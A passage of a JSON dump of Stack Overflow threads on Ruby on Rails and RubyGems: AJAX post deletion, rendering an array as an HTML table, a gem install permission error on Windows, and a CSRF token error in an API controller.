'simple_posts/shared/posts_empty' %&gt;\n&lt;% else %&gt;\n\n  &lt;div id=\"post-navigation\"&gt;\n    &lt;%= render 'simple_posts/shared/posts_navigation' %&gt;\n  &lt;/div&gt;\n\n  &lt;%= simple_posts_edit_button(current_user, @simple_post)%&gt;\n  &lt;%= simple_posts_delete_button(current_user, @simple_post)%&gt;   #button helper\n\n  &lt;div id=\"show_post\"&gt;\n    &lt;%= render @simple_post %&gt;\n    &lt;%= yield %&gt;\n   &lt;/div&gt;\n\n  &lt;%end %&gt;\n</code></pre>\n\n<p><code>_posts_navigation.html.erb</code></p>\n\n<pre><code>&lt;div class=\"bootstrap-vertical-nav\"&gt;\n  &lt;ul class=\"nav flex-column\"&gt;\n    &lt;% @user.simple_posts.reverse_each do |post|%&gt;\n      &lt;li class=\"nav-item\" id=\"&lt;%= @simple_post.id %&gt;\"&gt;\n        &lt;%= link_to post.title, user_simple_post_path(@user, post), remote: true, class:\"nav-link text-dark\" %&gt;\n      &lt;/li&gt;\n    &lt;% end %&gt;\n  &lt;/ul&gt;\n&lt;/div&gt;\n\n&lt;% if @user.id == current_user.id %&gt;\n  &lt;%= link_to \"+ New Post\", new_user_simple_post_path(current_user), class: \"btn btn-info w-100\", role: \"button\" %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p><code>destroy.js.erb</code></p>\n\n<pre><code>$('li#&lt;%= @simple_post.id %&gt;').remove();\n</code></pre>\n\n<p><code>simple_posts_controller.rb</code></p>\n\n<pre><code>def destroy\n    @simple_post.destroy\n    @simple_post =current_user.simple_posts.first\n    respond_to do |format|\n    #   format.html { redirect_to simple_posts_url, notice: 'Simple post was successfully destroyed.' }\n      format.js\n    end\n  end\n</code></pre>\n\n<p>I tried to append in <code>destroy.js.erb</code> the same code from showing the post <code>$('#show_post').html(\"&lt;%=  escape_javascript render @simple_post %&gt;\");</code> but it's not working correctly. When deleting the first post (but only that one) the next one is shown but the post is not removed from the navigation. I also tried <code>$('#post-navigation').html(\"&lt;%=  escape_javascript render partial: 'simple_posts/shared/posts_navigation' %&gt;\");</code> and it nothing happens.</p>\n\n<p>Also I tried to reload the whole panel with <code>$('#post-panel').html(\"&lt;%=  escape_javascript render partial: 'simple_posts/shared/posts_panel' %&gt;\");</code>in <code>show.html.erb</code> of user but again: nothing. I'm not sure if I have to specify in which view or partial exactly it has to render the partial. </p>\n\n<p>I don't really know how to approach this further. </p>\n\n<p><strong>Edit 1</strong></p>\n\n<pre><code>ButtonHelper.rb\ndef simple_posts_delete_button(current_user, simple_post)\n    if(current_user.id == @user.id)\n      link_to svg('x-square'), [current_user, simple_post], remote: true, method: :delete, class:\"btn\"\n    end\n  end\n</code></pre>\n\n<p><strong>Edit 2</strong></p>\n\n<p>show-action from <code>simple_posts_controller.rb</code></p>\n\n<pre><code>  def show\n    @user = User.find{params[:id]}\n    @simple_post = SimplePost.find(params[:id])\n      respond_to do |format|\n      format.js\n      format.html # show.html.erb\n    end\n  end\n</code></pre>\n\n<p><code>show.js.erb</code></p>\n\n<pre><code>$('#post-actions').html(\"&lt;%=  j render partial: 'simple_posts/shared/posts_actions', locals: {simple_post: @simple_post, user: @user} %&gt;\");\n$('#show-post').html(\"&lt;%= j render @simple_post %&gt;\");\n</code></pre>\n"}, {"tags": ["html", "ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535549318, "post_id": 52078601, "comment_id": 91107207, "body": "Please add code of view"}, {"owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "edited": false, "score": 0, "creation_date": 1535552066, "post_id": 52078601, "comment_id": 91109174, "body": "show your controller code (at least the listing action), not just the array assignment"}, {"owner": {"reputation": 7, "user_id": 9799192, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36513edf526c9fb70c0219158a823742?s=128&d=identicon&r=PG&f=1", "display_name": "Mamiko", "link": "https://stackoverflow.com/users/9799192/mamiko"}, "edited": false, "score": 0, "creation_date": 1535552925, "post_id": 52078601, "comment_id": 91109794, "body": "Thaks ! I edited the question"}], "answers": [{"comments": [{"owner": {"reputation": 7, "user_id": 9799192, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36513edf526c9fb70c0219158a823742?s=128&d=identicon&r=PG&f=1", "display_name": "Mamiko", "link": "https://stackoverflow.com/users/9799192/mamiko"}, "edited": false, "score": 0, "creation_date": 1535549828, "post_id": 52078700, "comment_id": 91107561, "body": "Thank you I changed myarr to @myarr in my controller but i have always the same error &quot;undefined method `each&#39; for nil:NilClass&quot;"}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "reply_to_user": {"reputation": 7, "user_id": 9799192, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36513edf526c9fb70c0219158a823742?s=128&d=identicon&r=PG&f=1", "display_name": "Mamiko", "link": "https://stackoverflow.com/users/9799192/mamiko"}, "edited": false, "score": 0, "creation_date": 1535549973, "post_id": 52078700, "comment_id": 91107672, "body": "Please add the name of controller  and action. also add the name of view file in question"}, {"owner": {"reputation": 7, "user_id": 9799192, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36513edf526c9fb70c0219158a823742?s=128&d=identicon&r=PG&f=1", "display_name": "Mamiko", "link": "https://stackoverflow.com/users/9799192/mamiko"}, "edited": false, "score": 0, "creation_date": 1535617245, "post_id": 52078700, "comment_id": 91134479, "body": "Yes :) Thank You !"}], "tags": [], "owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "is_accepted": false, "score": 1, "last_activity_date": 1535549489, "creation_date": 1535549489, "answer_id": 52078700, "question_id": 52078601, "link": "https://stackoverflow.com/questions/52078601/ruby-on-rails-array-to-html-table/52078700#52078700", "title": "Ruby on rails array to HTML table", "body": "<p>Take instance variable <code>@myarr</code> instead of only <code>myarr</code>\nYou defined <code>@myarr</code> in view which are correct , Change <code>myarr</code> to <code>@myarr</code> in controller action</p>\n"}, {"tags": [], "owner": {"reputation": 1405, "user_id": 7023415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a7f3b4db177eeb60558058e587628f7?s=128&d=identicon&r=PG&f=1", "display_name": "Leo", "link": "https://stackoverflow.com/users/7023415/leo"}, "is_accepted": false, "score": 2, "last_activity_date": 1535549773, "creation_date": 1535549773, "answer_id": 52078786, "question_id": 52078601, "link": "https://stackoverflow.com/questions/52078601/ruby-on-rails-array-to-html-table/52078786#52078786", "title": "Ruby on rails array to HTML table", "body": "<p><code>@myarr</code> is not the same as <code>myarr</code>. You must change <code>myarr = [...]</code> to <code>@myarr = [...]</code>.</p>\n\n<p>Also, if <code>{ville_id: '1', ville_name: 'Paris', population: 2000000, pays: 'France'}</code> is <code>Hash</code> (not <code>Class</code> or <code>OpenStruct</code>) update view too:</p>\n\n<pre><code>   &lt;% @myarr.each do |myarr| %&gt;\n      &lt;tr&gt;\n        &lt;td&gt;&lt;%= myarr[:ville_id] %&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;%= myarr[:ville_name] %&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;%= myarr[:population] %&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;%= myarr[:pays] %&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n    &lt;% end %&gt;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2401, "user_id": 2208682, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/49fac145ccb00fbe71298cf953cbd43b?s=128&d=identicon&r=PG", "display_name": "GoGoCarl", "link": "https://stackoverflow.com/users/2208682/gogocarl"}, "is_accepted": true, "score": 2, "last_activity_date": 1535554560, "creation_date": 1535554560, "answer_id": 52080541, "question_id": 52078601, "link": "https://stackoverflow.com/questions/52078601/ruby-on-rails-array-to-html-table/52080541#52080541", "title": "Ruby on rails array to HTML table", "body": "<p>I don't think you can use an instance variable outside of the scope of the controller instance. In the way you are using it, you could only declare it as a class variable (i.e. <code>@@my_arr</code>), which you probably don't want to do.</p>\n\n<p>Instead, you should wrap the declaration of <code>@my_arr</code> in a method:</p>\n\n<pre><code>class PagesController &lt; ApplicationController\n\n  def listing\n    @my_arr = [{ville_id: '1', ville_name: 'Paris', population: 2000000, pays: 'France'},\n              {ville_id: '2', ville_name: 'Madrid', population: 3000000, pays: 'Espagne'},\n              {ville_id: '3', ville_name: 'Marrakech', population: 1000000, pays: 'Maroc'},\n              {ville_id: '4', ville_name: 'Tokyo', population: 9000000, pays: 'Japon'},\n              {ville_id: '5', ville_name: 'Istanbul', population: 15000000, pays: 'Turquie'}]\n  end\n\nend\n</code></pre>\n\n<p>The method is named <code>listing</code> to correspond with the view.</p>\n\n<p>Also, as someone else mentioned, you are creating <code>Hash</code> objects, and properties of those objects are accessed via the <code>[]</code> method (yes, <code>[]</code> is a method!), i.e. <code>myarr[:ville_id]</code>, <code>myarr[:ville_name]</code>, etc.).</p>\n"}, {"tags": [], "owner": {"reputation": 536, "user_id": 8436554, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/d3XUa.jpg?s=128&g=1", "display_name": "Amr Adel", "link": "https://stackoverflow.com/users/8436554/amr-adel"}, "is_accepted": false, "score": 0, "last_activity_date": 1535575689, "creation_date": 1535575689, "answer_id": 52085861, "question_id": 52078601, "link": "https://stackoverflow.com/questions/52078601/ruby-on-rails-array-to-html-table/52085861#52085861", "title": "Ruby on rails array to HTML table", "body": "<p>If you are using <code>@myarr</code> only in view and it is not needed in the controller logic, I believe her becomes the role of the <em>Helpers</em>, You can simply define a method in a helper (<code>application_helper.rb</code> or <code>page_helper.rb</code>), I prefer creating a helper for the controller like this:</p>\n\n<pre><code>module PageHelper\n  def my_list\n         [{ville_id: '1', ville_name: 'Paris', population: 2000000, pays: 'France'},\n          {ville_id: '2', ville_name: 'Madrid', population: 3000000, pays: 'Espagne'},\n          {ville_id: '3', ville_name: 'Marrakech', population: 1000000, pays: 'Maroc'},\n          {ville_id: '4', ville_name: 'Tokyo', population: 9000000, pays: 'Japon'},\n          {ville_id: '5', ville_name: 'Istanbul', population: 15000000, pays: 'Turquie'}]\n  end\nend\n</code></pre>\n\n<p>Then this will clear your controller, and in <code>view</code> you have to use it like this:</p>\n\n<pre><code>&lt;% my_list.each do |myarr| %&gt;\n      &lt;tr&gt;\n        &lt;td&gt;&lt;%= myarr.ville_id %&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;%= myarr.ville_name %&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;%= myarr.population %&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;%= myarr.pays %&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n &lt;% end %&gt;\n</code></pre>\n\n<p>Of course you can customize <code>my_list</code> by giving it params and make it works as you like, I prefer this way, But remember when only this instance variable <code>@myvar</code> is only needed in the view layer, Hope this helps.</p>\n"}], "owner": {"reputation": 7, "user_id": 9799192, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36513edf526c9fb70c0219158a823742?s=128&d=identicon&r=PG&f=1", "display_name": "Mamiko", "link": "https://stackoverflow.com/users/9799192/mamiko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 364, "favorite_count": 0, "accepted_answer_id": 52080541, "answer_count": 4, "score": -1, "last_activity_date": 1535575689, "creation_date": 1535549161, "last_edit_date": 1535552892, "question_id": 52078601, "link": "https://stackoverflow.com/questions/52078601/ruby-on-rails-array-to-html-table", "title": "Ruby on rails array to HTML table", "body": "<p>Hi after I tried a lot of code and read a lot of documentation I have always the same error </p>\n\n<blockquote>\n  <p>undefined method `each' for <code>nil</code>:<code>NilClass</code></p>\n</blockquote>\n\n<p>My code conttrollers/pages_controller.rb:</p>\n\n<pre><code> class PagesController &lt; ApplicationController\n\n    myarr =  [{ville_id: '1', ville_name: 'Paris', population: 2000000, pays: 'France'},\n              {ville_id: '2', ville_name: 'Madrid', population: 3000000, pays: 'Espagne'},\n              {ville_id: '3', ville_name: 'Marrakech', population: 1000000, pays: 'Maroc'},\n              {ville_id: '4', ville_name: 'Tokyo', population: 9000000, pays: 'Japon'},\n              {ville_id: '5', ville_name: 'Istanbul', population: 15000000, pays: 'Turquie'}]\n\nend\n</code></pre>\n\n<p>And my erb html code layouts/pages/listing.html.erb: </p>\n\n<pre><code>    &lt;table class=\"table table-condensed\"&gt;\n      &lt;thead&gt;\n        &lt;tr&gt;\n          &lt;th&gt;Ville Id&lt;/th&gt;\n          &lt;th&gt;Ville&lt;/th&gt;\n          &lt;th&gt;Population&lt;/th&gt;\n          &lt;th&gt;Pays&lt;/th&gt;\n        &lt;/tr&gt;\n      &lt;/thead&gt;\n      &lt;tbody&gt;\n        &lt;% @myarr.each do |myarr| %&gt;\n          &lt;tr&gt;\n            &lt;td&gt;&lt;%= myarr.ville_id %&gt;&lt;/td&gt;\n            &lt;td&gt;&lt;%= myarr.ville_name %&gt;&lt;/td&gt;\n            &lt;td&gt;&lt;%= myarr.population %&gt;&lt;/td&gt;\n            &lt;td&gt;&lt;%= myarr.pays %&gt;&lt;/td&gt;\n          &lt;/tr&gt;\n        &lt;% end %&gt;\n      &lt;/tbody&gt;\n    &lt;/table&gt;\n</code></pre>\n\n<p>Thanks for your help!  </p>\n"}, {"tags": ["ruby", "rubygems"], "comments": [{"owner": {"reputation": 211, "user_id": 4207625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6b672c1aaa6bf9e222e114ec0d1384da?s=128&d=identicon&r=PG&f=1", "display_name": "V&#225;clav Pruner", "link": "https://stackoverflow.com/users/4207625/v%c3%a1clav-pruner"}, "edited": false, "score": 0, "creation_date": 1535553063, "post_id": 52078092, "comment_id": 91109902, "body": "SPEC CACHE DIRECTORY still links to your H drive. Try looking at <a href=\"https://stackoverflow.com/questions/24303180/rubygems-how-to-change-gem-environment-settings\">this</a> thread."}, {"owner": {"reputation": 65, "user_id": 8901451, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4677509aa264f14c33276033a9f0a5f3?s=128&d=identicon&r=PG&f=1", "display_name": "Majid", "link": "https://stackoverflow.com/users/8901451/majid"}, "reply_to_user": {"reputation": 211, "user_id": 4207625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6b672c1aaa6bf9e222e114ec0d1384da?s=128&d=identicon&r=PG&f=1", "display_name": "V&#225;clav Pruner", "link": "https://stackoverflow.com/users/4207625/v%c3%a1clav-pruner"}, "edited": false, "score": 0, "creation_date": 1535557838, "post_id": 52078092, "comment_id": 91113340, "body": "How to do these in windows :    export GEM_PATH=/Users/myusername/Tools/.rbenv/versions/2.1.0/lib/r&zwnj;&#8203;uby/gems/2.1.0 export GEM_SPEC_CACHE=/Users/myusername/Tools/.rbenv/versions/2.1.0&zwnj;&#8203;/lib/ruby/gems/specs"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535561679, "post_id": 52078092, "comment_id": 91115380, "body": "@Majid <a href=\"https://www.google.co.uk/search?q=windows+set+environment+variable\" rel=\"nofollow noreferrer\">google.co.uk/search?q=windows+set+environment+variable</a>"}, {"owner": {"reputation": 65, "user_id": 8901451, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4677509aa264f14c33276033a9f0a5f3?s=128&d=identicon&r=PG&f=1", "display_name": "Majid", "link": "https://stackoverflow.com/users/8901451/majid"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535568006, "post_id": 52078092, "comment_id": 91118567, "body": "@Tom Lord, I have already added C:\\Users\\alotfi2\\.gem\\specs to PATH in windows, but  still get :   GEM PATHS:      - C:/Ruby24-x64/lib/ruby/gems/2.4.0      - H:/.gem/ruby/2.4.0"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535571001, "post_id": 52078092, "comment_id": 91119891, "body": "What do you mean? That link says you need to update the gem specs cache, not the gem path."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535571042, "post_id": 52078092, "comment_id": 91119910, "body": "And this has got nothing to do with updating your PATH."}, {"owner": {"reputation": 65, "user_id": 8901451, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4677509aa264f14c33276033a9f0a5f3?s=128&d=identicon&r=PG&f=1", "display_name": "Majid", "link": "https://stackoverflow.com/users/8901451/majid"}, "edited": false, "score": 0, "creation_date": 1535572925, "post_id": 52078092, "comment_id": 91120731, "body": "How  to update the gem specs cache in Windows 7 ?"}], "answers": [{"tags": [], "owner": {"reputation": 211, "user_id": 4207625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6b672c1aaa6bf9e222e114ec0d1384da?s=128&d=identicon&r=PG&f=1", "display_name": "V&#225;clav Pruner", "link": "https://stackoverflow.com/users/4207625/v%c3%a1clav-pruner"}, "is_accepted": false, "score": 0, "last_activity_date": 1535622195, "last_edit_date": 1535622195, "creation_date": 1535614422, "answer_id": 52091534, "question_id": 52078092, "link": "https://stackoverflow.com/questions/52078092/permission-denied-when-installing-a-new-gem/52091534#52091534", "title": "Permission denied, when installing a new gem", "body": "<p>Your SPEC CACHE DIRECTORY still links to your H: drive, to change its value, you have to set environment variable GEM_SPEC_CACHE as stated in <a href=\"https://stackoverflow.com/questions/24303180/rubygems-how-to-change-gem-environment-settings\">this thread</a>.<br>\nTo do so on Windows, you would want to use <a href=\"https://ss64.com/nt/setx.html\" rel=\"nofollow noreferrer\">SetX</a> command. For example:  </p>\n\n<pre><code>SETX GEM_SPEC_CACHE C:\\Users\\User\\.gem\\abc  \n</code></pre>\n\n<p>You should have writing access rights to directory C:\\Users\\User\\.gem\\abc for it to work.</p>\n"}], "owner": {"reputation": 65, "user_id": 8901451, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4677509aa264f14c33276033a9f0a5f3?s=128&d=identicon&r=PG&f=1", "display_name": "Majid", "link": "https://stackoverflow.com/users/8901451/majid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 454, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535622195, "creation_date": 1535547581, "question_id": 52078092, "link": "https://stackoverflow.com/questions/52078092/permission-denied-when-installing-a-new-gem", "title": "Permission denied, when installing a new gem", "body": "<p>I am in Windows 7, I can see that all my gems are in :\nC:\\Users\\alotfi2.gem\\specs\\api.rubygems.org%443\\quick\\Marshal.4.8</p>\n\n<p>Last week we received an email from the admin that said :</p>\n\n<p>After migration, your H: drive will be read-only. This means you'll be able to access and transfer your files but you won't be able to edit them or save any new files to your H: drive.</p>\n\n<p>but when I tried to install a new gem I got :</p>\n\n<p>gem install chronic\nERROR:  While executing gem ... (Errno::EACCES)\n    Permission denied @ rb_sysopen - H:/.gem/specs/api.rubygems.org%443/quick/Marshal.4.8/chronic-0.10.2.gemspec</p>\n\n<pre><code>gem environment\nRubyGems Environment:\n  - RUBYGEMS VERSION: 2.3.0\n  - RUBY VERSION: 2.4.2 (2017-09-14 patchlevel 198) [x64-mingw32]\n  - INSTALLATION DIRECTORY: C:/Ruby24-x64/lib/ruby/gems/2.4.0\n  - RUBY EXECUTABLE: C:/Ruby24-x64/bin/ruby.exe\n  - EXECUTABLE DIRECTORY: C:/Ruby24-x64/bin\n  - SPEC CACHE DIRECTORY: H:/.gem/specs\n  - SYSTEM CONFIGURATION DIRECTORY: C:/ProgramData\n  - RUBYGEMS PLATFORMS:\n    - ruby\n    - x64-mingw32\n  - GEM PATHS:\n     - C:/Ruby24-x64/lib/ruby/gems/2.4.0\n     - H:/.gem/ruby/2.4.0\n  - GEM CONFIGURATION:\n     - :update_sources =&gt; true\n     - :verbose =&gt; true\n     - :backtrace =&gt; false\n     - :bulk_threshold =&gt; 1000\n  - REMOTE SOURCES:\n     - https://rubygems.org/\n  - SHELL PATH:\n     - C:\\majid\\cmder\\bin\n     - C:\\majid\\cmder\\vendor\\git-for-windows\\cmd\n     - C:\\majid\\cmder\\vendor\\conemu-maximus5\\ConEmu\\Scripts\n     - C:\\majid\\cmder\\vendor\\conemu-maximus5\n     - C:\\majid\\cmder\\vendor\\conemu-maximus5\\ConEmu\n     - C:\\Program Files (x86)\\Shoes\n     - C:\\Ruby24-x64\\bin\n     - C:\\Users\\alotfi2\\AppData\\Local\\Programs\\Python\\Python36-32\\Scripts\\\n     - C:\\Users\\alotfi2\\AppData\\Local\\Programs\\Python\\Python36-32\\\n     - C:\\Users\\alotfi2\\AppData\\Roaming\\npm\n     - C:\\Program Files\\Docker Toolbox\n     - C:\\majid\\cmder\\vendor\\git-for-windows\\usr\\bin\n     - C:\\majid\\cmder\\vendor\\git-for-windows\\usr\\share\\vim\\vim74\n     - C:\\majid\\cmder\\\n</code></pre>\n\n<p>your help is appreciated .\nThanks.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "api", "react-native", "post"], "comments": [{"owner": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535546155, "post_id": 52077158, "comment_id": 91104919, "body": "Can you show Address model code?"}, {"owner": {"reputation": 467, "user_id": 5323216, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206553142180222/picture?type=large", "display_name": "Aly Dabbous", "link": "https://stackoverflow.com/users/5323216/aly-dabbous"}, "reply_to_user": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535546231, "post_id": 52077158, "comment_id": 91104959, "body": "class Address &lt; ApplicationRecord     has_many :senders      has_many :receivers end"}, {"owner": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535546384, "post_id": 52077158, "comment_id": 91105069, "body": "Can you save address like this: address.save! And show output"}, {"owner": {"reputation": 467, "user_id": 5323216, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206553142180222/picture?type=large", "display_name": "Aly Dabbous", "link": "https://stackoverflow.com/users/5323216/aly-dabbous"}, "reply_to_user": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535547954, "post_id": 52077158, "comment_id": 91106265, "body": "Started POST &quot;/addresses&quot; for 127.0.0.1 at 2018-08-29 15:02:06 +0200 Processing by AddressesController#create as <i>/</i>   Parameters: {&quot;address&quot;=&gt;{&quot;streetname&quot;=&gt;&quot;Witte De Westraat&quot;, &quot;zipcode&quot;=&gt;&quot;1065FJ&quot;, &quot;city&quot;=&gt;&quot;Amsterdam&quot;, &quot;country&quot;=&gt;&quot;The Netherlands&quot;}}    (0.1ms)  begin transaction"}, {"owner": {"reputation": 467, "user_id": 5323216, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206553142180222/picture?type=large", "display_name": "Aly Dabbous", "link": "https://stackoverflow.com/users/5323216/aly-dabbous"}, "reply_to_user": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535547980, "post_id": 52077158, "comment_id": 91106287, "body": "\u21b3 app/controllers/addresses_controller.rb:10   Address Create (0.8ms)  INSERT INTO &quot;addresses&quot; (&quot;streetname&quot;, &quot;zipcode&quot;, &quot;city&quot;, &quot;country&quot;, &quot;created_at&quot;, &quot;updated_at&quot;) VALUES (?, ?, ?, ?, ?, ?)  [[&quot;streetname&quot;, &quot;Witte De Westraat&quot;], [&quot;zipcode&quot;, &quot;1065FJ&quot;], [&quot;city&quot;, &quot;Amsterdam&quot;], [&quot;country&quot;, &quot;The Netherlands&quot;], [&quot;created_at&quot;, &quot;2018-08-29 13:02:06.301544&quot;], [&quot;updated_at&quot;, &quot;2018-08-29 13:02:06.301544&quot;]]   \u21b3 app/controllers/addresses_controller.rb:10    (1.2ms)  commit transaction   \u21b3 app/controllers/addresses_controller.rb:10"}, {"owner": {"reputation": 467, "user_id": 5323216, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206553142180222/picture?type=large", "display_name": "Aly Dabbous", "link": "https://stackoverflow.com/users/5323216/aly-dabbous"}, "reply_to_user": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535547988, "post_id": 52077158, "comment_id": 91106292, "body": "Completed 500 Internal Server Error in 14ms (Views: 0.5ms | ActiveRecord: 2.7ms)"}, {"owner": {"reputation": 467, "user_id": 5323216, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206553142180222/picture?type=large", "display_name": "Aly Dabbous", "link": "https://stackoverflow.com/users/5323216/aly-dabbous"}, "reply_to_user": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535548629, "post_id": 52077158, "comment_id": 91106741, "body": "I think its the same error, right?"}, {"owner": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535549347, "post_id": 52077158, "comment_id": 91107230, "body": "Something bad happens  on rendering. Try  render json: {status: &#39;address created successfully&#39;}.to_json, status: :create"}, {"owner": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "edited": false, "score": 0, "creation_date": 1535549428, "post_id": 52077158, "comment_id": 91107299, "body": "Probably you should give a try this tool <a href=\"https://github.com/cyu/rack-cors\" rel=\"nofollow noreferrer\">github.com/cyu/rack-cors</a>"}], "answers": [{"tags": [], "owner": {"reputation": 2233, "user_id": 529524, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/11ddeb78f3a0fcf0fd0075f522df6888?s=128&d=identicon&r=PG", "display_name": "Ahmed Ali", "link": "https://stackoverflow.com/users/529524/ahmed-ali"}, "is_accepted": true, "score": 0, "last_activity_date": 1548095095, "last_edit_date": 1548095095, "creation_date": 1535561355, "answer_id": 52082491, "question_id": 52077158, "link": "https://stackoverflow.com/questions/52077158/protect-from-forgery-with-null-session-still-getting-cant-verify-csrf-toke/52082491#52082491", "title": "protect_from_forgery with: :null_session -- still getting Can&#39;t verify CSRF token authenticity", "body": "<p>You can <code>ActionController::API</code> instead of <code>ApplicationController</code>, and I see a syntax error you wrote <code>status: :create</code> instead of <code>status: :created</code></p>\n"}], "owner": {"reputation": 467, "user_id": 5323216, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206553142180222/picture?type=large", "display_name": "Aly Dabbous", "link": "https://stackoverflow.com/users/5323216/aly-dabbous"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 841, "favorite_count": 0, "accepted_answer_id": 52082491, "answer_count": 1, "score": 0, "last_activity_date": 1548095095, "creation_date": 1535544720, "last_edit_date": 1535555820, "question_id": 52077158, 